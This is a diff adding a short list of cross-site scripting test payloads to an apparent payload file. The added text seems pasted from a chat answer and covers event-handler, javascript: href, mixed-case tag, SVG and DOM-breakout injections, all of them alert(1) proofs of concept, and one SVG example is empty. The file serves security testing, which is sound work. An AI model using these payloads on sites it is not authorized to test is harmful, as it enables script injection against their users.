@@ -56,6 +56,51 @@ Edit
 <style>@import 'javascript:alert(1)';</style>
 
 
+
+
+
+💥 Common Bypass Techniques (For Security Testing)
+Here are contextual payloads you can test, assuming you're doing this in a legally authorized pen test:
+
+1. Image/Event Handler Injection
+If user input is inserted into an HTML tag without encoding:
+
+html
+Copy
+Edit
+<img src="x" onerror="alert(1)">
+2. Anchor tag / href JavaScript
+If input is used in an anchor tag:
+
+html
+Copy
+Edit
+<a href="javascript:alert(1)">Click me</a>
+3. SVG-based injection
+If SVG is allowed:
+
+html
+Copy
+Edit
+
+4. Malformed Tag Injection
+Some filters fail to catch malformed or mixed case tags:
+
+html
+Copy
+Edit
+<ScRipT>alert(1)</ScRipT>
+5. DOM XSS
+If JavaScript on the page uses .innerHTML or .document.write() with unsanitized input:
+
+html
+Copy
+Edit
+"><script>alert(1)</script>
+Check for vulnerable client-side code that does this.
+
 <svg><script>confirm(1)</script>
 <svg/onload=alert(1)>
 <svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg/onload=alert(1)>
+
